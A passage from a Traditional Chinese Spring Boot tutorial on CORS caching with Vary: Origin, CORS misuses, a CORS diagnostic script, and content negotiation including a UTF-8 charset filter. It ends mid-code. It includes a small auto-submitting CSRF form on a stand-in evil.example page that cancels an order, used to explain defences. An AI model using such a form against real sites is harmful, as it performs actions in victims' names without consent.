**症狀**：「這支 API 在客服後台不能用，但在顧客前台可以」，
而且**重新部署或清快取就好了一陣子**。

**解法**：`Vary: Origin`。

```
Vary: Origin
```

它告訴所有快取層（CDN、Nginx、瀏覽器）：
**「這個回應的內容依 `Origin` 請求標頭而異，請分開快取。」**

**Spring 的行為**：

```java
// org.springframework.web.cors.DefaultCorsProcessor#process（簡化）
public boolean processRequest(CorsConfiguration config, HttpServletRequest request,
                              HttpServletResponse response) {
    Collection<String> varyHeaders = response.getHeaders(HttpHeaders.VARY);
    if (!varyHeaders.contains(HttpHeaders.ORIGIN)) {
        response.addHeader(HttpHeaders.VARY, HttpHeaders.ORIGIN);
    }
    if (!varyHeaders.contains(HttpHeaders.ACCESS_CONTROL_REQUEST_METHOD)) {
        response.addHeader(HttpHeaders.VARY, HttpHeaders.ACCESS_CONTROL_REQUEST_METHOD);
    }
    if (!varyHeaders.contains(HttpHeaders.ACCESS_CONTROL_REQUEST_HEADERS)) {
        response.addHeader(HttpHeaders.VARY, HttpHeaders.ACCESS_CONTROL_REQUEST_HEADERS);
    }
    // ...
}
```

✅ **Spring 自動加了這三個** —— 你不用做任何事。

⚠️ **但有兩個情況會弄掉它**：

**① `response.reset()`**（6.3.5 的問題 B）—— 已經修好（`PRESERVED_HEADERS` 含 `Vary`）。

**② 你自己 `setHeader("Vary", ...)`**：

```java
    // 🔴 這一行清掉了 Spring 加的三個 Vary 值
    response.setHeader("Vary", "Accept-Language");

    // ✅ 用 addHeader
    response.addHeader("Vary", "Accept-Language");
```

**`Vary` 的代價**：

```
Vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers,
      Accept-Language, Accept-Encoding

快取的 key = URL × Origin(3) × Method(7) × Headers(組合) × Language(2) × Encoding(3)
           = 快取命中率大幅下降
```

⚠️ **所以公開端點（6.3.5 的 `publicConfiguration`）用 `allowedOrigins("*")` 有一個
額外的好處**：`Access-Control-Allow-Origin: *` 對所有 origin 都一樣，
**所以 `Vary: Origin` 對它沒有意義**，CDN 可以用單一版本快取。

**但 Spring 還是會加 `Vary: Origin`**。如果你的商品 API 是 CDN 快取的重點，
可以移除它：

```java
package example.shop.common.web;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.core.annotation.Order;
import org.springframework.http.HttpHeaders;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.util.List;

/**
 * 對「Allow-Origin 是 *」的回應移除 {@code Vary: Origin}。
 *
 * <p>★ 為什麼值得做：商品列表是 shop-service 流量最大的端點，
 * 而 {@code Vary: Origin} 會讓 CDN 對每一個 origin（包含所有第三方網站）
 * 各存一份 —— 命中率從 98% 掉到不確定。
 *
 * <p>⚠️ 這是一個「精確但危險」的最佳化：
 * 只有在 {@code Access-Control-Allow-Origin} 真的是 {@code *} 時才安全。
 * 所以判斷條件寫得很保守，而且有一個測試守住它（6.10.2）。
 */
@Component
@Order(-199)                    // ★ 在 CorsFilter（-200）之後
public class VaryOriginOptimizationFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        chain.doFilter(request, response);

        // ★ 只有在回應 committed 之前才能改標頭
        if (response.isCommitted()) return;

        String allowOrigin = response.getHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN);
        if (!"*".equals(allowOrigin)) {
            return;                     // ★ 不是 * → 一定要保留 Vary: Origin
        }

        // ⚠️ 有 credentials 的回應絕對不能移除 Vary（雖然 * + credentials 不合法，
        //    但防禦性檢查很便宜）
        if (response.getHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS) != null) {
            return;
        }

        // 重建 Vary，只移除 Origin 與兩個 preflight 相關的值
        List<String> kept = response.getHeaders(HttpHeaders.VARY).stream()
                .filter(v -> !v.equalsIgnoreCase(HttpHeaders.ORIGIN))
                .filter(v -> !v.equalsIgnoreCase(HttpHeaders.ACCESS_CONTROL_REQUEST_METHOD))
                .filter(v -> !v.equalsIgnoreCase(HttpHeaders.ACCESS_CONTROL_REQUEST_HEADERS))
                .toList();

        // ⚠️ Servlet API 沒有「移除標頭」的方法 ——
        //    setHeader(name, null) 的行為未定義（依容器而異）。
        //    可靠的做法是 setHeader 第一個值再 addHeader 其餘的；
        //    如果全部都要移除，就設成空字串（HTTP 允許，快取會忽略）。
        if (kept.isEmpty()) {
            response.setHeader(HttpHeaders.VARY, "");
        } else {
            response.setHeader(HttpHeaders.VARY, kept.get(0));
            kept.stream().skip(1).forEach(v -> response.addHeader(HttpHeaders.VARY, v));
        }
    }
}
```

⚠️ **`setHeader(name, null)` 在不同容器上的行為不同**
（Tomcat 會設成字面的 `"null"`，Jetty 會忽略）——
這是一個很容易寫出 bug 的地方，所以上面用「重建」而不是「移除」。

> **這個 filter 是一個「要不要做」值得討論的最佳化。**
> 如果你的商品 API 不是流量瓶頸，**不要做** ——
> 它增加了一個需要被理解與測試的元件，換來一個你不需要的效能提升。
> shop-service 做它是因為 03-rest-api 第 08 章 8.3.9 的快取矩陣裡
> 商品列表是「最高快取價值」的端點。

### 6.3.8 CORS 不是安全機制

**三個常見的誤用**：

**誤用 1：「我設了 CORS，所以只有我的前端能用這支 API」**

```bash
# CORS 完全不影響非瀏覽器的客戶端
curl -H "Authorization: Bearer $TOKEN" https://api.shop.example/orders
# → 200，完整資料

# Python
requests.get('https://api.shop.example/orders', headers={'Authorization': f'Bearer {token}'})
# → 200
```

**CORS 是「瀏覽器對 JavaScript 的限制」，不是「伺服器對客戶端的限制」。**
授權必須靠 Spring Security（09 站）。

**誤用 2：「CORS 可以防 CSRF」**

6.3.1 的推論 ②：CSRF 不需要讀回應。

```html
<!-- evil.example 上的 HTML —— 完全不需要 JavaScript -->
<form action="https://api.shop.example/orders/ord_1/cancellations" method="POST">
  <input type="hidden" name="reason" value="whatever">
</form>
<script>document.forms[0].submit()</script>
```

⚠️ **這個請求的 `Content-Type` 是 `application/x-www-form-urlencoded`
（表單的預設）→ 是簡單請求 → 沒有 preflight → 直接送出並執行。**

**防 CSRF 要靠**：

| 手段 | 說明 |
|---|---|
| **只接受 `application/json`** ★ | HTML 表單無法送 JSON → 一定會 preflight → CORS 生效。**這是 JSON API 的天然防護** |
| `SameSite=Lax` / `Strict` cookie | 跨站請求不帶 cookie |
| **不用 cookie，用 `Authorization` header** ★ | 攻擊者的頁面無法讀取受害者的 token → 根本送不出有效請求 |
| CSRF token | 傳統做法（有 session 時） |

⚠️ **shop-service 用 Bearer token（不用 cookie），所以 CSRF 天然免疫** ——
但 05 章 5.11.9 提到 `EventSource` 不能帶 header，
**如果 SSE 改用 cookie 認證，就重新引入了 CSRF 風險**。

**這是一個真實的取捨**，shop-service 的處理：

```
① SSE 用一個「短期、單一用途」的 query token
   GET /orders/ord_1/events?sseToken=sse_abc...
   （和 05 章 5.10.6 的下載 token 同樣的設計：短期、hash 儲存、綁定資源）

② 那個 token 由一個正常的 Bearer 認證端點簽發
   POST /me/sse-tokens → { "token": "sse_abc...", "expiresIn": 60 }

③ 所以：
   · 不用 cookie → 沒有 CSRF 風險
   · EventSource 可以用（token 在 URL 裡）
   · token 只活 60 秒，而且只能用一次
```

**誤用 3：「preflight 通過了就代表授權通過」**

```java
    // 🔴 有人在 preflight 的處理裡做授權檢查
    @RequestMapping(method = RequestMethod.OPTIONS)
    public ResponseEntity<Void> preflight(@RequestHeader("Authorization") String auth) {
        // ⚠️ preflight 【不會】帶 Authorization！
    }
```

**preflight 是「協商」不是「認證」**。
它不帶 `Authorization`、不帶 cookie（除非 `Allow-Credentials`）、不帶 body。
**它只回答一個問題：「你允許這個 origin 用這個方法與這些標頭嗎？」**

### 6.3.9 CORS 的除錯流程

**症狀 → 原因** 的對照表（這是實務上最有用的一頁）：

| Console 的錯誤訊息 | 原因 | 修法 |
|---|---|---|
| `No 'Access-Control-Allow-Origin' header is present` | 回應完全沒有 CORS 標頭 | 檢查 origin 是否在白名單；**檢查是不是某個早期 filter 產生的回應**（6.3.5） |
| `The 'Access-Control-Allow-Origin' header has a value 'https://a' that is not equal to the supplied origin` | 白名單有這個網域但值不對；或**快取污染**（6.3.7） | 檢查 `Vary: Origin`；檢查 CDN |
| `Response to preflight request doesn't pass access control check` | preflight 的回應不對（通常是 401） | Security 要 `.cors()`，或明確放行 OPTIONS |
| `Method PATCH is not allowed by Access-Control-Allow-Methods` | `allowedMethods` 沒列 PATCH | 加上 |
| **`Request header field authorization is not allowed by Access-Control-Allow-Headers`** | ★ 用了 `*` 但 `*` 不涵蓋 `Authorization`（6.3.3） | **明確列出 `Authorization`** |
| `The value of the 'Access-Control-Allow-Credentials' header in the response is '' which must be 'true'` | 前端用了 `credentials: 'include'` 但後端沒設 | `allowCredentials(true)` |
| `Cannot use wildcard in Access-Control-Allow-Origin when credentials flag is true` | `*` + credentials | 用明確清單或 `allowedOriginPatterns` |
| **前端拿到回應但 `headers.get('ETag')` 是 `null`** | ★ 沒 expose（6.3.3） | 加進 `exposedHeaders` |
| `Redirect is not allowed for a preflight request` | preflight 收到 3xx | ⚠️ 檢查 `TrailingSlashRedirectFilter`（01 章 1.3.5）—— 它會對 `/orders/` 回 308，**而 preflight 不能被轉址** |

⚠️ **最後一列是一個 shop-service 特有的陷阱**：

```
OPTIONS /orders/     ← 前端不小心多了一個斜線
  → TrailingSlashRedirectFilter（-120）回 308 到 /orders
  → 🔴 瀏覽器：「preflight 不能被轉址」→ 請求失敗
  → 而且錯誤訊息不會告訴你是斜線的問題
```

**修法：`TrailingSlashRedirectFilter` 要跳過 preflight。**

```java
    /** 01 章 1.3.5 的 TrailingSlashRedirectFilter 補正。 */
    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        // ★ preflight 不可以被轉址（瀏覽器規格）
        //   而且轉址對 preflight 沒有意義（它只是在問「你允許嗎」）
        if ("OPTIONS".equals(request.getMethod())
                && request.getHeader("Access-Control-Request-Method") != null) {
            return true;
        }
        String uri = request.getRequestURI();
        return uri == null || uri.length() <= 1 || !uri.endsWith("/");
    }
```

**一個可以直接跑的診斷腳本**：

```bash
#!/usr/bin/env bash
# cors-check.sh —— 診斷一個端點的 CORS 設定
#
# 用法：cors-check.sh https://api.shop.example/orders https://shop.example POST
set -euo pipefail

URL="${1:?用法: cors-check.sh <url> <origin> [method]}"
ORIGIN="${2:?請提供 Origin}"
METHOD="${3:-GET}"

echo "════════════════════════════════════════════════════════"
echo " 1. Preflight（OPTIONS）"
echo "════════════════════════════════════════════════════════"
curl -sS -X OPTIONS "$URL" -o /dev/null -D - \
     -H "Origin: $ORIGIN" \
     -H "Access-Control-Request-Method: $METHOD" \
     -H "Access-Control-Request-Headers: authorization,content-type,idempotency-key" \
  | grep -iE 'HTTP/|access-control-|vary' || echo "（沒有任何 CORS 標頭）"

echo
echo "════════════════════════════════════════════════════════"
echo " 2. 實際請求（成功路徑）"
echo "════════════════════════════════════════════════════════"
curl -sS "$URL" -o /dev/null -D - \
     -H "Origin: $ORIGIN" \
     -H "Authorization: Bearer ${SHOP_TOKEN:-invalid}" \
  | grep -iE 'HTTP/|access-control-|vary' || echo "（沒有任何 CORS 標頭）"

echo
echo "════════════════════════════════════════════════════════"
echo " 3. 未認證的錯誤路徑（★ 最容易漏的）"
echo "════════════════════════════════════════════════════════"
curl -sS "$URL" -o /dev/null -D - \
     -H "Origin: $ORIGIN" \
  | grep -iE 'HTTP/|access-control-' || echo "🔴 401 的回應沒有 CORS 標頭！"

echo
echo "════════════════════════════════════════════════════════"
echo " 4. 過大 body 的錯誤路徑（★ Filter 產生的，6.3.5）"
echo "════════════════════════════════════════════════════════"
head -c 2000000 /dev/zero | tr '\0' 'a' > /tmp/cors-big-body.txt
curl -sS -X POST "$URL" -o /dev/null -D - \
     -H "Origin: $ORIGIN" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer ${SHOP_TOKEN:-invalid}" \
     --data-binary @/tmp/cors-big-body.txt \
  | grep -iE 'HTTP/|access-control-' || echo "🔴 413 的回應沒有 CORS 標頭！"
rm -f /tmp/cors-big-body.txt

echo
echo "════════════════════════════════════════════════════════"
echo " 5. 惡意 Origin（應該被拒絕，且不反射回去）"
echo "════════════════════════════════════════════════════════"
curl -sS "$URL" -o /dev/null -D - \
     -H "Origin: https://evil.example" \
  | grep -iE 'HTTP/|access-control-allow-origin' || echo "✅ 沒有 Allow-Origin（正確）"

echo
echo "════════════════════════════════════════════════════════"
echo " 判讀"
echo "════════════════════════════════════════════════════════"
cat <<'EOF'
✅ 1～4 都要有：
   · access-control-allow-origin: <你的 origin>（不是 *，因為我們用 credentials）
   · access-control-allow-credentials: true
   · vary: Origin
   · （1 額外要有）access-control-allow-methods / -headers / -max-age
   · （2、3、4 額外要有）access-control-expose-headers 含 X-Trace-Id

🔴 5 必須【沒有】access-control-allow-origin
   有的話代表你在反射 Origin —— 那是 6.2.2 的漏洞

⚠️ 特別注意 3 與 4：
   它們是 6.2.1 那個事故的兩個具體情況。
   很多專案的 1、2 是對的，3、4 是錯的 ——
   而那正好是使用者最需要看到錯誤訊息的時候。
EOF
```

---

## 6.4 內容協商

### 6.4.1 `Accept` 的 q 值與 Spring 的選擇演算法

**客戶端說「我要什麼」，伺服器說「我能給什麼」，內容協商決定交集。**

```http
Accept: application/json, text/csv;q=0.8, */*;q=0.1
```

**q 值（quality factor）是「偏好程度」，範圍 0～1，預設 1。**

| 媒體型別 | q | 意思 |
|---|---|---|
| `application/json` | 1.0（預設） | 最想要這個 |
| `text/csv` | 0.8 | 沒有 JSON 的話這個也行 |
| `*/*` | 0.1 | 什麼都行，但這是最後選擇 |
| 任何 `q=0` | — | **明確拒絕**這個型別 |

**Spring 的選擇演算法**（`AbstractMessageConverterMethodProcessor`）：

```
① 決定「可產生的型別」（producible media types）
   · 方法或類別上有 @RequestMapping(produces = ...) → 就是那些
   · 沒有 → 問所有 HttpMessageConverter：「你能寫這個回傳型別嗎？」
     收集它們支援的型別

② 決定「可接受的型別」（acceptable media types）
   · ContentNegotiationStrategy 決定 —— 預設是 HeaderContentNegotiationStrategy
     （讀 Accept 標頭）
   · Accept 缺失或是 */* → 視為 [*/*]

③ 求交集，並依「具體程度 + q 值」排序
   排序規則（MediaType.sortBySpecificityAndQuality）：
     具體 > 通配：  application/json  >  application/*  >  */*
     同具體程度時，q 值大者優先

④ 取第一個「不是通配」的型別當回應的 Content-Type
   · 如果最佳匹配是 */*，Spring 會挑第一個 producible 的具體型別

⑤ 交集為空 → HttpMediaTypeNotAcceptableException → 406
```

**幾個具體例子**（假設端點沒有 `produces`，而 converter 支援 JSON 與 CSV）：

| `Accept` | 回應的 `Content-Type` | 為什麼 |
|---|---|---|
| （沒有 Accept） | `application/json` | 視為 `*/*` → 挑第一個 producible |
| `*/*` | `application/json` | 同上 |
| `application/json` | `application/json` | 精確匹配 |
| `text/csv` | `text/csv` | 精確匹配 |
| `text/csv, application/json` | **`text/csv`** | ⚠️ 兩者 q 都是 1、具體程度相同 → **依 `Accept` 裡的出現順序** |
| `application/json;q=0.5, text/csv` | `text/csv` | csv 的 q 是 1 > 0.5 |
| `application/*` | `application/json` | `application/*` 匹配 JSON |
| `application/xml` | — → **406** | 沒有 XML converter |
| `application/json;q=0` | — → **406** | q=0 = 明確拒絕 |

⚠️ **第五列（`text/csv, application/json`）值得注意**：
q 值相同時，順序決定結果。**這是一個很容易讓前端「意外拿到 CSV」的情況** ——
而且問題出在前端的 `Accept` 標頭，後端完全沒改。

**所以有明確格式需求的端點一定要寫 `produces`**：

```java
    // ★ 明確宣告：這支端點只給 JSON
    @GetMapping(value = "/orders", produces = MediaType.APPLICATION_JSON_VALUE)
    public PageResponse<OrderSummary> list(...) { }

    // ★ 明確宣告：這支端點只給 CSV（05 章 5.9.2）
    @GetMapping(value = "/orders.csv", produces = "text/csv")
    public ResponseEntity<StreamingResponseBody> exportCsv(...) { }
```

⚠️ **`produces` 的第二個作用容易被忽略：它影響路由。**

```java
    @GetMapping(value = "/orders", produces = "application/json")
    public PageResponse<OrderSummary> json() { }

    @GetMapping(value = "/orders", produces = "text/csv")
    public ResponseEntity<StreamingResponseBody> csv() { }
```

**同一個路徑，依 `Accept` 分派到不同的方法。**
`RequestMappingInfo` 的 `ProducesRequestCondition` 做這件事。

| `Accept` | 打到哪個方法 |
|---|---|
| `application/json` | `json()` |
| `text/csv` | `csv()` |
| `*/*` | ⚠️ **`json()`**（第一個註冊的） |
| `application/xml` | — → **406**（兩個都不匹配） |

⚠️ **`*/*` 的行為依「方法在類別裡的順序」而定，那不是穩定的契約。**
如果兩種格式都是正當需求，**用不同的路徑**（`/orders` 與 `/orders.csv`）
比依賴 `Accept` 可靠得多 —— 這正是 shop-service 的選擇（05 章）。

**shop-service 的理由**（值得寫下來，因為它違反了「REST 純粹主義」）：

| 理由 | 說明 |
|---|---|
| 使用者會把 URL 貼給同事 | `/orders.csv` 貼過去對方也拿到 CSV；`/orders` + `Accept` 貼過去對方拿到 JSON |
| 瀏覽器直接開 | 位址欄無法設 `Accept`（瀏覽器送 `text/html,...`）|
| **錯誤訊息更清楚** | 「這個端點不支援 CSV」vs「請改用 /orders.csv」 |
| OpenAPI 文件更清楚 | 兩個獨立的 operation，各自的回應 schema |

### 6.4.2 `produces` / `consumes` 與 406 / 415 的判準

| | 檢查什麼 | 不匹配時 |
|---|---|---|
| `produces` | 請求的 **`Accept`** vs 我能產生的 | **406 Not Acceptable** |
| `consumes` | 請求的 **`Content-Type`** vs 我能讀的 | **415 Unsupported Media Type** |

**一句話記法**：

> **406 = 「我沒有你要的東西」（輸出方向）**
> **415 = 「我看不懂你給我的東西」（輸入方向）**

```java
    @PostMapping(
        value = "/orders",
        consumes = MediaType.APPLICATION_JSON_VALUE,      // 只吃 JSON
        produces = MediaType.APPLICATION_JSON_VALUE)      // 只吐 JSON
    public ResponseEntity<CreateOrderResponse> create(
            @RequestBody @Valid CreateOrderRequest request) { }
```

| 請求 | 結果 |
|---|---|
| `Content-Type: application/json` + `Accept: application/json` | ✅ 200/201 |
| `Content-Type: application/xml` | **415** |
| `Content-Type: text/plain` | **415** |
| **沒有 `Content-Type`** | **415**（有 body 卻沒宣告型別） |
| `Accept: application/xml` | **406** |
| `Accept: */*` | ✅ |

⚠️ **一個容易搞混的情況：`Content-Type` 對但 body 是壞的 JSON。**

```http
POST /orders
Content-Type: application/json

{ "items": [ }
```

→ **400**（`HttpMessageNotReadableException`），**不是 415**。
型別是對的，只是內容壞掉 —— 03 章 3.9 的 `MessageNotReadableAnalyzer` 處理它。

**三者的完整決策樹**：

```
請求進來
  │
  ├── Content-Type 不在 consumes 裡？ ────────────▶ 415
  │
  ├── Accept 與 produces 無交集？ ───────────────▶ 406
  │
  ├── body 無法解析成目標型別？ ──────────────────▶ 400（MALFORMED_REQUEST）
  │
  ├── 解析成功但驗證失敗？ ──────────────────────▶ 422（VALIDATION_FAILED）
  │
  └── 全部通過 ────────────────────────────────▶ Controller
```

⚠️ **`consumes` 的一個實務陷阱：`charset`。**

```java
    consumes = "application/json"
```

```http
Content-Type: application/json;charset=UTF-8     ← ✅ 匹配（Spring 忽略參數）
Content-Type: application/json; charset=utf-8    ← ✅ 匹配
Content-Type: application/json;charset=Big5      ← ✅ 匹配（!）
```

Spring 的 `MediaType.includes()` **只比對 type/subtype，忽略參數**。
所以 `charset=Big5` 也會通過 `consumes` 檢查 ——
然後 Jackson 會用 Big5 解 UTF-8 的位元組 → 中文變亂碼 → 可能通過驗證（長度沒超）
→ **亂碼存進資料庫**。

**修法：在 Jackson 的 converter 上固定 charset。**

```java
package example.shop.common.config;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.MediaType;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import java.nio.charset.StandardCharsets;
import java.util.List;

// ⚠️ 這是片段示意 —— 完整的 MessageConverterConfig 在 6.4.5，
//    那裡會說明為什麼一定要用 extendMessageConverters 而不是 configureMessageConverters。

    @Override
    public void extendMessageConverters(List<HttpMessageConverter<?>> converters) {
        for (HttpMessageConverter<?> converter : converters) {
            if (converter instanceof MappingJackson2HttpMessageConverter jackson) {
                // ★ 明確宣告支援的型別
                jackson.setSupportedMediaTypes(List.of(
                        MediaType.APPLICATION_JSON,
                        MediaType.valueOf("application/merge-patch+json"),
                        MediaType.valueOf("application/problem+json")));
            }
        }
    }
```

```java
package example.shop.common.web;

import example.shop.common.error.ErrorCode;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.core.annotation.Order;
import org.springframework.http.InvalidMediaTypeException;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Map;

/**
 * 拒絕非 UTF-8 的 JSON 請求。
 *
 * <p>★ 為什麼需要它（6.4.2）：
 * {@code consumes = "application/json"} 不檢查 charset，
 * 所以 {@code Content-Type: application/json;charset=Big5} 會通過，
 * 然後 UTF-8 的位元組被當 Big5 解讀 → <b>中文變亂碼但不報錯</b> →
 * 亂碼通過驗證（長度沒超）→ 進資料庫。
 *
 * <p>★ 為什麼是「拒絕」而不是「強制當 UTF-8」：
 * 客戶端明確宣告了 Big5，如果它真的送 Big5 而我們當 UTF-8 解，
 * 結果也是亂碼。<b>宣告與實際不符是客戶端的 bug，要讓它知道。</b>
 *
 * <p>⚠️ RFC 8259（JSON）規定 JSON 必須是 UTF-8（或 UTF-16/32），
 * 所以 {@code charset=Big5} 本身就違反規格 —— 回 415 是正確的。
 */
@Component
@Order(-117)                        // 在 CachedBodyFilter 附近，讀 body 之前
public class JsonCharsetFilter extends OncePerRequestFilter {

    private final ProblemWriter problemWriter;

    public JsonCharsetFilter(ProblemWriter problemWriter) {
        this.problemWriter = problemWriter;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {

        String rawContentType = request.getContentType();
        if (rawContentType == null) {
            chain.doFilter(request, response);
            return;
        }

        MediaType mediaType;
        try {
            mediaType = MediaType.parseMediaType(rawContentType);
        } catch (InvalidMediaTypeException e) {
            // ★ 壞掉的 Content-Type（例如 "application/json;;"）→ 415
            //   ⚠️ 不能讓它往下走 —— Spring 內部解析時也會拋，
            //      但那個例外的訊息會洩漏內部細節
            problemWriter.write(request, response, ErrorCode.UNSUPPORTED_MEDIA_TYPE,
                    "The Content-Type header could not be parsed.",
                    Map.of("hint", "請確認 Content-Type 格式，例如 application/json"));
            return;
        }

        boolean json = mediaType.getSubtype().equals("json")
                || mediaType.getSubtype().endsWith("+json");
        if (!json) {
            chain.doFilter(request, response);
            return;
        }

        Charset charset = mediaType.getCharset();
        // ★ 沒宣告 charset 是【正確】的做法（RFC 8259 說 JSON 就是 UTF-8）
        if (charset == null || StandardCharsets.UTF_8.equals(charset)) {
            chain.doFilter(request, response);
            return;
        }

        problemWriter.write(request, response, ErrorCode.UNSUPPORTED_MEDIA_TYPE,
                "JSON payloads must be UTF-8 encoded; got charset=%s.".formatted(charset),
                Map.of("receivedCharset", charset.name(),
                       "hint", "JSON 依 RFC 8259 必須使用 UTF-8。"
                             + "建議直接送 Content-Type: application/json（不帶 charset）。"));
    }

    /** ★ 沒有 body 的方法不用檢查。 */
    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        String method = request.getMethod();
        return "GET".equals(method) || "HEAD".equals(method)
                || "DELETE".equals(method) || "OPTIONS".equals(method)
                || "TRACE".equals(method);
    }
}
```

### 6.4.3 Boot 3 移除了 path extension 內容協商 ★

**這是升級 Boot 2 → 3 時會遇到的一個 breaking change。**

**Spring 5 / Boot 2 的行為**：

```java
    // Spring 5 的 ContentNegotiationConfigurer
    configurer.favorPathExtension(true);         // 已在 5.3 標記 deprecated
```

那個機制讓 `GET /orders.json` **自動**被當成 `Accept: application/json`，
`GET /orders.xml` 被當成 `Accept: application/xml`。

**Spring 6 / Boot 3 完全移除了它**（`PathExtensionContentNegotiationStrategy` 不存在了）。

**影響**：

| 舊行為（Boot 2） | 新行為（Boot 3） |
|---|---|
| `GET /orders.json` → JSON | 🔴 **404**（`/orders.json` 不是一個註冊的路徑） |
| `GET /orders.xml` → XML | 🔴 404 |
| `GET /orders` + `Accept: application/json` | ✅ 不變 |

⚠️ **這個變更同時修掉了一個安全問題**：

```
GET /orders/ord_1.json      舊行為：路徑變數 orderId = "ord_1"（副檔名被剝掉）
GET /orders/ord_1.html      舊行為：orderId = "ord_1"，但試圖回 HTML
GET /orders/ord_1.xyz       舊行為：orderId = "ord_1"

★ 「路徑變數會被剝掉副檔名」造成過真實的漏洞：
  一個 ID 是 "file.jsp" 的資源，用 GET /resources/file.jsp 存取時
  會被當成 "GET /resources/file 且 Accept: (jsp 對應的型別)"
  → 路由到意外的 handler
```

**Boot 3 的正確做法** —— 三個選項：

**選項 A：不同的路徑**（shop-service 的選擇，05 章）

```java
    @GetMapping(value = "/orders", produces = "application/json")
    public PageResponse<OrderSummary> list(...) { }

    // ★ /orders.csv 是一個【字面路徑】，不是「/orders 加副檔名」
    @GetMapping(value = "/orders.csv", produces = "text/csv")
    public ResponseEntity<StreamingResponseBody> csv(...) { }
```

⚠️ **`PathPatternParser`（Boot 3 的預設）把 `.` 當普通字元** ——
所以 `/orders.csv` 就是一個字面路徑，沒有任何特殊語意。乾淨明確。

**選項 B：`favorParameter`**（`?format=csv`）

```java
@Configuration
public class ContentNegotiationConfig implements WebMvcConfigurer {

    @Override
    public void configureContentNegotiation(ContentNegotiationConfigurer configurer) {
        configurer
                // ★ 允許用查詢參數指定格式
                .favorParameter(true)
                .parameterName("format")
                // ⚠️ 一定要 true：否則客戶端可以送任意 ?format=xxx，
                //    Spring 會試圖把它解析成媒體型別
                .useRegisteredExtensionsOnly(true)
                .mediaType("json", MediaType.APPLICATION_JSON)
                .mediaType("csv", MediaType.valueOf("text/csv"))
                // ★ 預設值：Accept 缺失或是 */* 時用這個
                .defaultContentType(MediaType.APPLICATION_JSON);
    }
}
```

```
GET /orders?format=csv      → text/csv
GET /orders?format=json     → application/json
GET /orders?format=yaml     → ⚠️ 沒註冊 → 忽略這個參數，回退到 Accept
```

⚠️ **`favorParameter` 與 04 章的「未知查詢參數要報錯」衝突**（01 章 1.7.5）：
`UnknownQueryParamInterceptor` 會看到 `format` 不在 handler 的參數清單裡 → 400。

**必須把它加進白名單**：

```java
    /** 01 章 1.7.5 的 UnknownQueryParamInterceptor 補正。 */
    private static final Set<String> ALWAYS_ALLOWED = Set.of(
            "page", "size", "sort",     // Spring Data 的分頁參數
            "format",                   // ★ 6.4.3 的內容協商參數
            "_",                        // jQuery 的快取破壞參數
            "utm_source", "utm_medium", "utm_campaign");   // 行銷追蹤（無害）
```

**選項 C：媒體型別版本**（6.4.6）

**shop-service 的決定**：

| 需求 | 做法 |
|---|---|
| CSV / xlsx 匯出 | **選項 A**（`/orders.csv`）—— 使用者要能貼 URL |
| 未來若要支援 XML | 選項 A（`/orders.xml`）—— 而且很可能永遠不需要 |
| API 版本 | **路徑版本**（`/v1/orders`）—— 03-rest-api 第 06 章的決定，不用媒體型別 |

⚠️ **不啟用 `favorParameter`** —— 理由是它與「未知參數報錯」的機制互相干擾，
而它帶來的便利（`?format=csv`）已經由 `/orders.csv` 提供了。

**但仍然要明確設 `defaultContentType`**：

```java
package example.shop.common.config;

import org.springframework.context.annotation.Configuration;
import org.springframework.http.MediaType;
import org.springframework.web.servlet.config.annotation.ContentNegotiationConfigurer;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

/**
 * 內容協商設定。
 *
 * <p>★ shop-service 刻意「什麼都不啟用」，只設一個預設型別。
 * 這一節的價值不在程式碼有多少，而在<b>明確記錄了四個「不做」的決定</b>。
 */
@Configuration
public class ContentNegotiationConfig implements WebMvcConfigurer {

    @Override
    public void configureContentNegotiation(ContentNegotiationConfigurer configurer) {

        // ★ 唯一啟用的：Accept 缺失或是 */* 時的預設型別。
        //   ⚠️ 沒有這一行時，Spring 會挑「第一個能寫這個回傳型別的 converter」——
        //      那個順序在加了自訂 converter 之後可能改變（6.4.5），
        //      造成「某天開始回 CSV 而不是 JSON」這種難以理解的變化。
        configurer.defaultContentType(MediaType.APPLICATION_JSON);

        // ❌ 不啟用 favorParameter（?format=csv）
        //    理由：與 UnknownQueryParamInterceptor（01 章 1.7.5）互相干擾，
        //         而 /orders.csv 已經提供了同樣的能力。

        // ❌ favorPathExtension 在 Spring 6 已被移除 —— 沒得選（6.4.3）。

        // ❌ 不註冊 XML converter
        //    理由：沒有客戶端需要 XML。加一個「沒人用的格式」等於
        //         多一組要維護的序列化行為與多一個攻擊面（XXE）。

        // ❌ 不啟用 ignoreAcceptHeader
        //    理由：那會讓所有端點都回預設型別，/orders.csv 就壞了。
    }
}
```

> **這種「記錄不做什麼」的設定類別很值得寫。**
> 三個月後有人問「為什麼不能用 `?format=xml`」，
> 答案就在程式碼裡，而不是在某個人的記憶裡。

### 6.4.4 自訂 `HttpMessageConverter`：讓 `List<T>` 直接回 CSV

**動機**：05 章 5.9.2 的 CSV 匯出需要手寫 `StreamingResponseBody`，
Controller 裡有 30 行「組 CSV」的程式碼。
如果有一個 converter，Controller 可以退回 5 行。

```java
package example.shop.common.web.converter;

import example.shop.common.web.CsvWriter;
